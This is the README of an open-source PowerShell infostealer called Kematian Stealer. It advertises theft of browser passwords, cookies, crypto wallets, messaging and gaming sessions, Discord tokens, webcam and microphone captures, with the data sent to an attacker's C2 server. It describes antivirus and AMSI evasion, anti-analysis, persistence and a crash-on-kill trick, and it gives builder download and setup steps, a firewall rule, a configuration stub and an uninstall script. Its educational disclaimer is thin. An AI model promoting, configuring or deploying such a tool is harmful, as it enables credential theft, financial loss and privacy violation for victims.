<div align="center">
<img src="https://raw.githubusercontent.com/Pirate-Devs/Kematian/main/assets/kematian.png", width="400", height="400">
</div>

<div align="center">
  <a href="https://github.com/Pirate-Devs/Kematian/actions/workflows/build_builder.yml">
  <img src="https://img.shields.io/github/actions/workflow/status/Pirate-Devs/Kematian/build_builder.yml?style=flat&label=builder-src&color=fa7202" alt="Builder Src"></a>
  <a href="https://github.com/Pirate-Devs/Kematian/actions/workflows/build_backend.yml">
    <img src="https://img.shields.io/github/actions/workflow/status/Pirate-Devs/Kematian/build_backend.yml?style=flat&label=kematian-src&color=fa7202" alt="Kematian Src">
  </a>
  <br>
  <a href="https://github.com/Pirate-Devs/Kematian">
    <img src="https://img.shields.io/github/languages/top/Pirate-Devs/Kematian?color=fa7202" alt="Top Language"></a>
  <a href="https://github.com/Pirate-Devs/Kematian/stargazers">
    <img src="https://img.shields.io/github/stars/Pirate-Devs/Kematian?style=flat&color=fa7202" alt="Stars"></a>
  <a href="https://github.com/Pirate-Devs/Kematian/forks">
    <img src="https://img.shields.io/github/forks/Pirate-Devs/Kematian?style=flat&color=fa7202" alt="Forks"></a>
  <a href="https://github.com/Pirate-Devs/Kematian/issues">
    <img src="https://img.shields.io/github/issues/Pirate-Devs/Kematian?style=flat&color=fa7202" alt="Issues"></a>
  <a href="https://github.com/Pirate-Devs/Kematian/commits">
    <img src="https://img.shields.io/github/commit-activity/m/Pirate-Devs/Kematian?color=fa7202" alt="Commit Activity"></a>
  <a href="https://github.com/Pirate-Devs/Kematian/tree/main/frontend-src">
    <img src="https://img.shields.io/badge/Powershell-v5.0-fa7202" alt="Powershell v5.0"></a>
  <br>
  <a href="https://github.com/Pirate-Devs/Kematian?tab=MIT-1-ov-file">
    <img src="https://img.shields.io/github/license/Pirate-Devs/Kematian?color=fa7202" alt="License"></a>
  <a href="https://github.com/Pirate-Devs/Kematian/graphs/contributors">
    <img src="https://img.shields.io/github/contributors/Pirate-Devs/Kematian?color=fa7202" alt="Contributors"></a>
  <a href="https://github.com/Pirate-Devs/Kematian">
    <img src="https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2FSomali-Devs%2FKematian-Stealer&count_bg=%23FA7202&title_bg=%23555555&icon=&icon_color=%23E7E7E7&title=views&edge_flat=false" alt="Views"></a>
  <a href="https://github.com/Pirate-Devs/Kematian">
    <img src="https://img.shields.io/github/repo-size/Pirate-Devs/Kematian?color=fa7202" alt="Repo Size"></a>
  <a href="https://github.com/Pirate-Devs/Kematian">
    <img src="https://img.shields.io/github/downloads/Pirate-Devs/Kematian/total?color=fa7202" alt="Total Downloads"></a>
</div>


<h1 align="center">Kematian Stealer</h1>

# About The Project
Kematian Stealer is a [PowerShell-based](https://learn.microsoft.com/en-us/powershell/scripting/overview?view=powershell-5.1) tool designed to effortlessly infiltrate and exfiltrate data from Windows systems. All information collected is transmitted via TCP to your C2 server, where everything is decrypted. It functions seamlessly across any `x64bit` system, from `Windows 10` or later, ensuring compatibility with the latest updates. With Kematian Stealer, you can retrieve `seed phrases, session files, passwords, application data, Discord tokens` and more.

This tool is particularly advantageous for accessing application and file data without restrictions, while evading conventional security measures such as `firewalls` and `antivirus` software, thanks to its `fileless capabilities`, which set it apart from other stealers. Upon execution, Kematian Stealer creates a `mutex` on the system and designates the process as `critical` before initiating data exfiltration, ensuring smooth and uninterrupted transmission of data.

Moreover, the tool has robust `persistence mechanisms` to remain active on the machine after reboot. Additionally, its user-friendly web-based `GUI builder` simplifies the process of creating payloads, enhancing its accessibility and usability.
<br>

# Use Cases

- **Security Audits**: For ethical hackers or system administrators to test the security and data exposure of local systems.
- **Data Recovery**: Assists in recovering lost passwords, cookies and other crucial data for legitimate purposes without dropping compiled binaries on disk.

> [!TIP]
> Please refrain from opening issues related to detections, as it is pointless. This project's objective is to facilitate teaching and learning. If you need a FUD stealer, simply create one or REFUD it yourself. 

# Usage
## Setup Instructions And Video Guide Below 
<a href="https://devs.sped.lol/kematian-stealer"><img src="https://img.shields.io/badge/GitBook-6A6965?style=for-the-badge&logo=gitbook&logoColor=white"></a>
<a href="https://youtu.be/k-vastcKfwY"><img src="https://img.shields.io/badge/YouTube-FF0000?style=for-the-badge&logo=youtube&logoColor=white"></a>
- Download [Builder](https://github.com/Pirate-Devs/Kematian/releases/download/AutoBuild/main.exe) from the releases.
- The builder will automatically generate your `private key` and `certificate` at first run, you can find them here `$env:appdata\Kematian-Stealer`
- After opening the builder, it will also start a local server which will run on `https://127.0.0.1:8080` by default.
- Open your web browser and go to `https://127.0.0.1:8080/builder`
- Input your C2 server in the `TCP TUNNEL URL:PORT` section
- Open the port in `Windows Firewall` for receiving logs 
```ps1
New-NetFirewallRule -DisplayName "KematianC2" -Direction Inbound -Protocol TCP -LocalPort 8080 -Action Allow
```
- Next, activate the checkboxes for the features you want to include in the stub.
- Finally hit build and the output stub will be placed in the same folder with the builder
- Your logs will be saved here : `$env:appdata\Kematian-Stealer\logs`
 
 > [!NOTE]   
 > **THE DEBUG OPTION IS FOR TESTING PURPOSES ONLY**

### Configurations
```ps1
$c2_server = "YOUR_URL_HERE_SERVER" 
$debug = $false
$blockhostsfile = $false
$criticalprocess = $false
$melt = $false
$fakeerror = $false
$persistence = $false
$write_disk_only = $false
$vm_protect = $false
$encryption_key = "YOUR_ENC_KEY_HERE"
```

# Requirements
- To build Kematian, you need:
- Windows 10 or higher `x64`.
- Powershell `v5.0` or higher.
- An active internet connection.

# Obfuscation 
- [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) for `.ps1` files
- [Somalifuscator](https://github.com/KDot227/SomalifuscatorV2) for `.bat` files 

# Screenshots
  ## 🔨 Builder
> ![builder](https://raw.githubusercontent.com/Pirate-Devs/Kematian/main/assets/builder.png)

   ### Builder Features
 - [x] 🔸 Obfuscation of `BAT` and `PS1` files
 - [x] 🔩 Compilation of Exe Files 
 - [x] 💉 Pump/Inject the output exe file with `zero-filled` bytes 

#  Features
- [x] GUI Builder
- [x] No Dependencies
- [x] Fileless  
- [x] Anti-Kill (Terminating Kematian will result in a system crash, indicated by a `BSoD` [blue screen of death](https://support.microsoft.com/en-us/windows/resolving-blue-screen-errors-in-windows-60b01860-58f2-be66-7516-5c45a66ae3c6)).
- [x] [Mutex](https://learn.microsoft.com/en-us/dotnet/api/system.threading.mutex?view=net-7.0) (single instance)
- [x] Force [UAC](https://learn.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [x] Antivirus Evasion: Bypass [AMSI](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal), disables [ETW](https://learn.microsoft.com/en-us/windows-hardware/drivers/devtest/event-tracing-for-windows--etw-) and excluded from `Windows Defender` 
- [x] Block [Hosts](https://support.microsoft.com/en-us/topic/how-to-reset-the-hosts-file-back-to-the-default-c2a43f9d-e176-c6f3-e4ef-3500277a6dae) File
- [x] Anti-Analysis `VMWare, VirtualBox, Sandboxes, Emulators, Debuggers, Virustotal, Any.run`
- [x] Persistence via [Task Scheduler](https://learn.microsoft.com/en-us/windows/win32/taskschd/about-the-task-scheduler) 
- [x] Extracts WiFi Passwords
- [x] Files Stealer `2fa codes, seedphrases, passwords, privatekeys, etc.` 
- [x] 📷 Webcam & Desktop Screenshots
- [x] Record Microphone 🎙
- [x] Session Stealers 
  - [x] Messaging
  - [Element](https://element.io)
  - [ICQ](https://icq.com)
  - [Signal](https://signal.org)
  - [Telegram](https://telegram.org) 
  - [Viber](https://viber.com)
  - [WhatsApp](https://whatsapp.com)
  - [Skype](https://skype.com/en/get-skype/)
  - [Pidgin](https://pidgin.im)
  - [Tox](https://tox.chat/index.html)
  - [x] Gaming 
  - [Electronic Arts](https://ea.com)
  - [Epic Games](https://store.epicgames.com)
  - [Growtopia](https://growtopiagame.com)
  - [Minecraft](https://minecraft.net) (14 launchers) 
  - [Ubisoft](https://ubisoftconnect.com)
  - [Steam](https://store.steampowered.com)
  - [Battle.net](https://battle.net)
  - [x] VPN Clients
  - [Proton](https://protonvpn.com)
  - [Surfshark](https://surfshark.com)
  - [OpenVPN](https://openvpn.net/client)
  - [x] Email Clients
  - [Thunderbird](https://www.thunderbird.net)
  - [Mailbird](https://www.getmailbird.com) 
  - [x] FTP Clients
  - [FileZilla](https://filezilla-project.org)
  - [WinSCP](https://winscp.net/eng/index.php)
  - [CoreFTP](https://coreftp.com)
  - [SmartFTP](https://smartftp.com)
  - [x] Crypto Wallets
  - Collects from 10+ desktop wallets and 20+ browser extensions.
  - [x] Password Managers
  - Collects from 9 major password extensions 
- [x] Browsers `Gecko Browsers` and `Chromium Browsers`
  - 🔑 Passwords
  - 🍪 Cookies
  - 📜 History
  - 🌏 Bookmarks
- [x] Extracts [Discord](https://discord.com) tokens from Discord applications, `Chromium browsers` and `Gecko browsers`.
- [x] Get System Information (Version, CPU, DISK, GPU, RAM, IP, Installed Apps etc.)
- [x] Fake Error: Tricks the user into thinking that the program closed due to an error.
- [x] List of Installed Antiviruses
- [x] List of all Network Adapters
- [x] List of Apps that Run On Startup
- [x] List of Running Services & Applications
- [x] Extracts Product Key
- [x] Self-Destructs After Execution (optional)
 
## 🗑 Uninstaller (Removes the Scheduled Task, Script Folder, ExclusionPaths and Resets Hosts File)
- Open a new Elevated Powershell Console then copy & paste the contents below
```ps1
$ErrorActionPreference = "SilentlyContinue"
function Cleanup {
  Unregister-ScheduledTask -TaskName "Kematian" -Confirm:$False
  Remove-Item -Path "$env:appdata\Kematian" -force -recurse
  Remove-MpPreference -ExclusionPath "$env:APPDATA\Kematian"
  Remove-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
$resethostsfile = @'
# Copyright (c) 1993-2006 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host
# localhost name resolution is handle within DNS itself.
#       127.0.0.1       localhost
#       ::1             localhost
'@
  [IO.File]::WriteAllText("$env:windir\System32\Drivers\etc\hosts", $resethostsfile)
  Write-Host "[~] Successfully Uninstalled Kematian !" -ForegroundColor Green
}
Cleanup
```

# Need Help?
- [Join the discussion group](https://t.me/+RHUnNVumwmlmM2Fh)

# Bug Reports and Suggestions
Found a bug? Have an idea? Let me know [here](https://github.com/Pirate-Devs/Kematian/issues), Please provide a detailed explanation of the expected behavior, actual behavior, and steps to reproduce, or what you want to see and how it could be done. You can be a small part of this project!

# License
This project is licensed under the MIT License - see the [LICENSE](https://github.com/Pirate-Devs/Kematian/blob/main/LICENSE) file for details

# Disclaimer
The developers of Kematian Stealer disclaim any liability for actions or damages resulting from the use of this software. Users are fully responsible for their actions and recognize that this tool is intended solely for educational use. It is not meant to be used for malicious purposes or on systems that you do not own or have permission to access. By using this software, you implicitly agree to these terms.

# References
- https://www.cyfirma.com/research/kematian-stealer-a-deep-dive-into-a-new-information-stealer
- https://labs.k7computing.com/index.php/kematian-stealer-forked-from-powershell-token-grabber

# Author
- https://github.com/KDot227

# Credits
- https://github.com/Chainski
- https://github.com/EvilBytecode
- [ebthit](https://t.me/ebthit)
- [Smug246](https://github.com/Smug246)

# Other Contact
Want to reach out about something? My email is kdot227@waifu.club

<div align="center"><a href=#top>Back to Top</a></div>
